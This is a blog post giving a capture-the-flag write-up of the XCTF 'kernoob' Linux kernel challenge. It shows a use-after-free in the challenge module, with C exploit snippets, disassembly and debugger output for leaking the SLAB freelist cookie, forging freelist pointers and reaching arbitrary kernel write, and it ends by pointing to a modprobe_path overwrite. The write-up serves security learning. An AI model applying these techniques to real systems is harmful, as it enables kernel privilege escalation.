<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="今天是来到陌生城市的第66天，隔离起来的第52天，距离原定的复工日期已经18天。 总算等到重回正轨的好消息了。 国外的情况还是很严峻啊，祝福国外的朋友平安顺利。 This time is a challenge from last week’s CTF game organized by XCTF with many Chinese universities. This chanllenge is">
<meta property="og:type" content="article">
<meta property="og:title" content="[XCTF新春战疫] kernoob">
<meta property="og:url" content="http://matshao.com/2020/03/15/XCTF新春战疫-kernoob/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="今天是来到陌生城市的第66天，隔离起来的第52天，距离原定的复工日期已经18天。 总算等到重回正轨的好消息了。 国外的情况还是很严峻啊，祝福国外的朋友平安顺利。 This time is a challenge from last week’s CTF game organized by XCTF with many Chinese universities. This chanllenge is">
<meta property="og:locale" content="zh-hk">
<meta property="og:updated_time" content="2020-03-16T03:14:54.851Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[XCTF新春战疫] kernoob">
<meta name="twitter:description" content="今天是来到陌生城市的第66天，隔离起来的第52天，距离原定的复工日期已经18天。 总算等到重回正轨的好消息了。 国外的情况还是很严峻啊，祝福国外的朋友平安顺利。 This time is a challenge from last week’s CTF game organized by XCTF with many Chinese universities. This chanllenge is">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2020/03/15/XCTF新春战疫-kernoob/">





  <title> [XCTF新春战疫] kernoob | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2020/03/15/XCTF新春战疫-kernoob/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [XCTF新春战疫] kernoob
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-15T22:40:34+08:00">
                2020-03-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>今天是来到陌生城市的第66天，隔离起来的第52天，距离原定的复工日期已经18天。<br>
总算等到重回正轨的好消息了。<br>
国外的情况还是很严峻啊，祝福国外的朋友平安顺利。</p>
<p>This time is a challenge from last week’s CTF game organized by XCTF with many Chinese universities. This chanllenge is a linux kernel exploitation designed by SixStar Team. I didn’t finished it during the game, most of the time I spent on searching for objects to refill the size <code>0x20-0x70</code>, only at very last moment I realize there was a freelist harderned in the kernel. Many teams solved it by unexpected solution because of the deployment mistake, which is unpleasant, but it is still a good challenge.</p>
<p>I learned the solution from <a href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener">Kernoob: kmalloc without SMAP</a>, thanks Kirin! Based on his writeup, I will make some notes about the debugging and details of the bypass.</p>
<a id="more"></a>
<h2 id="vulnerability"><a class="header-anchor" href="#vulnerability">¶</a>Vulnerability</h2>
<p>You can download the challenge file from: <a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2020/tree/master/2020_Fight_with_virus/Pwn/Kernoob" target="_blank" rel="noopener">https://github.com/hebtuerror404/CTF_competition_warehouse_2020/tree/master/2020_Fight_with_virus/Pwn/Kernoob</a>.<br>
The kernel module is really simple, it provides <code>add</code>, <code>delete</code>, <code>show</code>, <code>edit</code> with ioctl. No KASLR, No SMAP.<br>
These is an obvious UAF, the first thought is using comman <code>tty_struct</code> tricks to hijack control flow. However the allocate size is restricted to <code>0x20-0x70</code>, which is too small for comman refilling objects. The correct solution is bypassing the freelist harderned and achieve arbitrary write.</p>
<h2 id="the-freelist-harderned"><a class="header-anchor" href="#the-freelist-harderned">¶</a>The freelist harderned</h2>
<p>There is a post illustrates this implementation in depth, <a href="https://paper.seebug.org/470/" target="_blank" rel="noopener">Linux kernel 4.14 SLAB_FREELIST_HARDENED 简单分析</a>. I will pick the important code here.<br>
patch1:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>patch2:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_dereference</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">void</span> *ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> freelist_ptr(s, (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(ptr_addr),</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prefetch_freepointer</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object)</span><br><span class="line">        prefetch(freelist_dereference(s, object + s-&gt;offset));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>For the first patch, if we look at a freed chunk with a successor, instead of a vaild pointer, its <code>fd</code> is xored with a <code>cookie</code> and the address of the chunk itself.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0xffff880004dbac00</span></span><br><span class="line"><span class="number">0xffff880004dbac00</span>:     <span class="number">0xa779aa0b3ec8798b</span>[fd]  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffff880004dbac10</span>:     <span class="number">0xffff880004de6000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>We still could use the UAF to change a freed chunks’fd to make the <code>kmalloc</code> return wanted address, but we need to know the <code>cookie</code> and the address of current chunk, also the <code>prefetch_freepointer</code> needs to take care, it will checks the the <code>fd</code> of fake chunk.</p>
<p>Because we don’t have the kernel with debug symbols – Of course we can compile a kernel with debug symbols and debuging with the source code, but in that way we could not load the vulnerable kernel module because of the module verification. If you know some tricks about force loading a kernel module in CTF challenge, please let me know. Anyway, we’d better look at the assembly code from the given kernel binary.<br>
First thing is to located the address of <code>__kmalloc</code> from the vm.</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat <span class="regexp">/proc/</span>kallsyms | <span class="keyword">grep</span> __kmalloc</span><br><span class="line">ffffffff81242c80 T __kmalloc</span><br></pre></td></tr></table></figure>
<p>And inside this function, we could scroll down a little bit and see the harderned code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D21      mov     r11, [r8]                      |  r8: ptr_addr</span><br><span class="line">.text:FFFFFFFF81242D24      xor     r11, [r9+<span class="number">140</span>h]                 |  [r9+<span class="number">140</span>h]: s-&gt;random</span><br><span class="line">.text:FFFFFFFF81242D2B      mov     rbx, r8                        |</span><br><span class="line">.text:FFFFFFFF81242D2E      xor     rbx, r11                       |  rbx: real ptr</span><br><span class="line">.text:FFFFFFFF81242D31      lea     rsi, [rdi]                     |</span><br><span class="line">.text:FFFFFFFF81242D34      call    sub_FFFFFFFF81984E70           |</span><br><span class="line">.text:FFFFFFFF81242D39      test    al, al                         |</span><br><span class="line">.text:FFFFFFFF81242D3B      jz      <span class="keyword">short</span> loc_FFFFFFFF81242CE9     |</span><br><span class="line">.text:FFFFFFFF81242D3D      cmp     r8, r11                        |</span><br><span class="line">.text:FFFFFFFF81242D40      jz      <span class="keyword">short</span> loc_FFFFFFFF81242D56     |</span><br><span class="line">.text:FFFFFFFF81242D42      movsxd  rax, dword ptr [r9+<span class="number">20</span>h]        |</span><br><span class="line">.text:FFFFFFFF81242D46      add     rbx, rax                       |</span><br><span class="line">.text:FFFFFFFF81242D49      xor     rbx, [rbx]                     |</span><br><span class="line">.text:FFFFFFFF81242D4C      xor     rbx, [r9+<span class="number">140</span>h]                 |</span><br><span class="line">.text:FFFFFFFF81242D53      prefetcht0 byte ptr [rbx]              | [rbx] should be zero</span><br></pre></td></tr></table></figure>
<p>This is compiled from <code>freelist_ptr</code> and <code>prefetch_freepointer</code>, but they are inlined into <code>__kmalloc</code>.</p>
<h2 id="exploitation"><a class="header-anchor" href="#exploitation">¶</a>Exploitation</h2>
<h3 id="leaking-cookie"><a class="header-anchor" href="#leaking-cookie">¶</a>Leaking cookie</h3>
<p>With the UAF and <code>show</code> operation, we can easily leak the obfuscated pointer. According to <code>(void *)((unsigned long)ptr ^ s-&gt;random ^ ptr_addr)</code>, we also need the slab chunk address and the real pointer to calculate <code>s-&gt;random</code>(cookie). Kirin’s writeup suggested that we can get a pointer <code>chunk+0x28</code> when allocating chunks size of <code>0x60</code>. I’ve tried other size but only <code>0x60</code> works, and the pointers won’t appear every time, so we need to search for it.</p>
<p>If the pointer is presented, we record the index of that chunk and calculate its address.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> victim_idx[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> victim_ptr[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> victim_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; <span class="number">0x18</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (victim_cnt &gt;= <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    alloc(fd, i, BUF_SIZE);</span><br><span class="line">    show(fd, i, buf, BUF_SIZE);</span><br><span class="line">    potential_ptr = ((<span class="keyword">size_t</span> *)(buf))[<span class="number">5</span>];</span><br><span class="line">    ptr = ((potential_ptr &amp; <span class="number">0xffff000000000000</span>)  ? potential_ptr - <span class="number">0x28</span> : ptr);</span><br><span class="line">    <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">        victim_idx[victim_cnt] = i;</span><br><span class="line">        victim_ptr[victim_cnt] = ptr;</span><br><span class="line">        victim_cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    potential_ptr = <span class="number">0</span>;</span><br><span class="line">    ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And we can calculate the cookie after deleteing two chunks, <code>victim_idx[0]</code> is the end of the freelist, and its <code>fd = cookies ^ chunk_addr</code>. So we can get the cookie.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span>(fd, victim_idx[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">delete</span>(fd, victim_idx[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// freelist -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">show(fd, victim_idx[<span class="number">0</span>], buf, BUF_SIZE);</span><br><span class="line"><span class="keyword">size_t</span> leak0 = ((<span class="keyword">size_t</span> *)(buf))[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"leak0: %lx\n"</span>, leak0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> cookie = leak0 ^ victim_ptr[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cookie: %lx\n"</span>, cookie);</span><br></pre></td></tr></table></figure>
<h2 id="faking-fd"><a class="header-anchor" href="#faking-fd">¶</a>Faking FD</h2>
<p>Let’s see if we can get arbitrary address by faking the fd. Now we have the freelist like: <code>freelist -&gt; 1 -&gt; 0</code>, if we faking <code>victim_idx[1]</code>'s fd by the rule and allocate twice, it should give us what we want.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fake_usermem = mmap(<span class="number">0xdead0000</span>, <span class="number">0x10000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fake_usermem: %lx\n"</span>, fake_usermem);</span><br><span class="line"></span><br><span class="line"><span class="comment">//faking this as the last node on the list</span></span><br><span class="line"><span class="keyword">size_t</span> fake_ptr = cookie ^ fake_usermem;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="number">0xdead0000</span>, &amp;fake_ptr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> target = cookie2 ^ victim_ptr[<span class="number">1</span>] ^ fake_usermem;</span><br><span class="line"></span><br><span class="line">edit(fd, victim_idx[<span class="number">1</span>], &amp;target, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target0: %lx\n"</span>, target);</span><br><span class="line"></span><br><span class="line">alloc(fd, <span class="number">0x18</span>, BUF_SIZE);</span><br><span class="line">alloc(fd, <span class="number">0x19</span>, BUF_SIZE);</span><br></pre></td></tr></table></figure>
<p>And we can see <code>0xdead0000</code> is put on the pool.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx $pool+<span class="number">0x180</span></span><br><span class="line"><span class="number">0xffffffffc0004640</span>:     <span class="number">0xffff880004db9540</span>      <span class="number">0x0000000000000060</span></span><br><span class="line"><span class="number">0xffffffffc0004650</span>:     <span class="number">0x00000000dead0000</span>      <span class="number">0x0000000000000060</span></span><br></pre></td></tr></table></figure>
<p>In this way we could write arbitray 4 bytes on the <code>pool</code>. Our final goal is tricking the the <code>kmalloc</code> return a pointer on <code>pool</code>, so that we can achieve arbitrary write. Let’s reason what will happen if we directly faking a pointer inside <code>pool</code> as fd.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D21      mov     r11, [r8]                      |  assume r8 == <span class="number">0xffffffffc00044c0</span>(pool), it points to a chunk addr like:<span class="number">0xffff880004e2d540</span></span><br><span class="line">.text:FFFFFFFF81242D24      xor     r11, [r9+<span class="number">140</span>h]                 |  assume cookie == <span class="number">0xaaaabbbbccccdddd</span></span><br><span class="line">.text:FFFFFFFF81242D2B      mov     rbx, r8                        |</span><br><span class="line">.text:FFFFFFFF81242D2E      xor     rbx, r11                       |  rbx = <span class="number">0xffffffffc00044c0</span> ^ <span class="number">0xaaaabbbbccccdddd</span> ^ <span class="number">0xffff880004e2d540</span> = <span class="number">0xaaaacc44082e4c5d</span></span><br><span class="line">.text:FFFFFFFF81242D31      lea     rsi, [rdi]                     |</span><br><span class="line">.text:FFFFFFFF81242D34      call    sub_FFFFFFFF81984E70           |</span><br><span class="line">.text:FFFFFFFF81242D39      test    al, al                         |</span><br><span class="line">.text:FFFFFFFF81242D3B      jz      <span class="keyword">short</span> loc_FFFFFFFF81242CE9     |</span><br><span class="line">.text:FFFFFFFF81242D3D      cmp     r8, r11                        |</span><br><span class="line">.text:FFFFFFFF81242D40      jz      <span class="keyword">short</span> loc_FFFFFFFF81242D56     |</span><br><span class="line">.text:FFFFFFFF81242D42      movsxd  rax, dword ptr [r9+<span class="number">20</span>h]        |</span><br><span class="line">.text:FFFFFFFF81242D46      add     rbx, rax                       |</span><br><span class="line">.text:FFFFFFFF81242D49      xor     rbx, [rbx]                     |  invaild memory access panic: <span class="number">0xaaaacc44082e4c5d</span></span><br><span class="line">.text:FFFFFFFF81242D4C      xor     rbx, [r9+<span class="number">140</span>h]                 |</span><br><span class="line">.text:FFFFFFFF81242D53      prefetcht0 byte ptr [rbx]              |</span><br></pre></td></tr></table></figure>
<p>Of cause we can choose a address inside pool where points to null pointer, but that will still leads to invaild memory access panic.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D21      mov     r11, [r8]                      |  assume r8 == <span class="number">0xffffffffc0004660</span>(pool+<span class="number">0x1a0</span>), it points to a chunk addr like:<span class="number">0</span></span><br><span class="line">.text:FFFFFFFF81242D24      xor     r11, [r9+<span class="number">140</span>h]                 |  assume cookie == <span class="number">0xaaaabbbbccccdddd</span></span><br><span class="line">.text:FFFFFFFF81242D2B      mov     rbx, r8                        |</span><br><span class="line">.text:FFFFFFFF81242D2E      xor     rbx, r11                       |  rbx = <span class="number">0xffffffffc0004660</span> ^ <span class="number">0xaaaabbbbccccdddd</span> ^ <span class="number">0</span> = <span class="number">0x55554444</span> <span class="number">0</span>ccc9bbd</span><br><span class="line">.text:FFFFFFFF81242D31      lea     rsi, [rdi]                     |</span><br><span class="line">.text:FFFFFFFF81242D34      call    sub_FFFFFFFF81984E70           |</span><br><span class="line">.text:FFFFFFFF81242D39      test    al, al                         |</span><br><span class="line">.text:FFFFFFFF81242D3B      jz      <span class="keyword">short</span> loc_FFFFFFFF81242CE9     |</span><br><span class="line">.text:FFFFFFFF81242D3D      cmp     r8, r11                        |</span><br><span class="line">.text:FFFFFFFF81242D40      jz      <span class="keyword">short</span> loc_FFFFFFFF81242D56     |</span><br><span class="line">.text:FFFFFFFF81242D42      movsxd  rax, dword ptr [r9+<span class="number">20</span>h]        |</span><br><span class="line">.text:FFFFFFFF81242D46      add     rbx, rax                       |</span><br><span class="line">.text:FFFFFFFF81242D49      xor     rbx, [rbx]                     |  invaild memory access panic: <span class="number">0x555544440ccc9bbd</span></span><br><span class="line">.text:FFFFFFFF81242D4C      xor     rbx, [r9+<span class="number">140</span>h]                 |</span><br><span class="line">.text:FFFFFFFF81242D53      prefetcht0 byte ptr [rbx]              |</span><br></pre></td></tr></table></figure>
<p>As mentioned above, we can write arbitrary 4 bytes on the pool, for example if we write <code>0x55554444</code> on <code>0xffffffffc0004650</code>, and fake the fd as <code>0xffffffffc000464c</code>, the situation will like:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81242D21      mov     r11, [r8]                      |  assume r8 == <span class="number">0xffffffffc000464c</span>, it points to a chunk addr like:<span class="number">0x5555444400000000</span></span><br><span class="line">.text:FFFFFFFF81242D24      xor     r11, [r9+<span class="number">140</span>h]                 |  assume cookie == <span class="number">0xaaaabbbbccccdddd</span></span><br><span class="line">.text:FFFFFFFF81242D2B      mov     rbx, r8                        |</span><br><span class="line">.text:FFFFFFFF81242D2E      xor     rbx, r11                       |  rbx = <span class="number">0xffffffffc0004660</span> ^ <span class="number">0xaaaabbbbccccdddd</span> ^ <span class="number">0x5555444400000000</span> = <span class="number">0xccc9bbd</span></span><br><span class="line">.text:FFFFFFFF81242D31      lea     rsi, [rdi]                     |</span><br><span class="line">.text:FFFFFFFF81242D34      call    sub_FFFFFFFF81984E70           |</span><br><span class="line">.text:FFFFFFFF81242D39      test    al, al                         |</span><br><span class="line">.text:FFFFFFFF81242D3B      jz      <span class="keyword">short</span> loc_FFFFFFFF81242CE9     |</span><br><span class="line">.text:FFFFFFFF81242D3D      cmp     r8, r11                        |</span><br><span class="line">.text:FFFFFFFF81242D40      jz      <span class="keyword">short</span> loc_FFFFFFFF81242D56     |</span><br><span class="line">.text:FFFFFFFF81242D42      movsxd  rax, dword ptr [r9+<span class="number">20</span>h]        |</span><br><span class="line">.text:FFFFFFFF81242D46      add     rbx, rax                       |</span><br><span class="line">.text:FFFFFFFF81242D49      xor     rbx, [rbx]                     |  now rbx = <span class="number">0xccc9bbd</span>, we could mmap <span class="keyword">this</span> address from userspace.</span><br><span class="line">.text:FFFFFFFF81242D4C      xor     rbx, [r9+<span class="number">140</span>h]                 |  <span class="built_in">set</span> [rbx] = rbx ^ cookie to pass prefetch.</span><br><span class="line">.text:FFFFFFFF81242D53      prefetcht0 byte ptr [rbx]              |</span><br></pre></td></tr></table></figure>
<p>so the idea is write <code>(module_base ^ cookie) &gt;&gt; 32</code> on the address <code>pool_a</code>, and faking the fd as <code>pool_a-4</code>, so during the xor, the higher 4 byte will be zero. Then <code>rbx</code> becomes an address we can mmap from userspace. Don’t forget to set <code>[rbx] = rbx ^ cookie</code> to bypass prefetch.</p>
<p>Then we can have a pointer inside pool on the pool, an arbitrary write primitive. Then we can overwrite <code>modprode_path</code>, and perform the modprode trick.</p>
<h2 id="exp-c"><a class="header-anchor" href="#exp-c">¶</a>exp.c</h2>
